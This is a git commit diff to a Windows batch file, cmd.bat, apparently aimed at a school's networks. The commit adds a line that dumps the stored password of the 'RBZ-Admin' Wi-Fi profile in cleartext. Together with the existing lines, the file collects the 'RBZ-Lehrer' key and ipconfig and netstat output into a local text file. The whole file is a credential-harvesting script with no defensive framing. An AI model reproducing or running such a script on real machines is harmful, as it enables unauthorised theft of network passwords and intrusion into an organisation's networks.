ca04a8497636662fe3939d457f69e07c67bc449e
chukfinley <77645077+chukfinley@users.noreply.github.com>
2021-09-18 21:49:04 +0200

    Update cmd.bat

--- cmd.bat
+++ cmd.bat
@@ -1,4 +1,5 @@
 netsh wlan show profile "RBZ-Lehrer" key=clear > \1bla.txt
+netsh wlan show profile "RBZ-Admin" key=clear >> \1bla.txt
 ipconfig >> \1bla.txt
 ipconfig /all >> \1bla.txt
 netstat -ano >> \1bla.txt
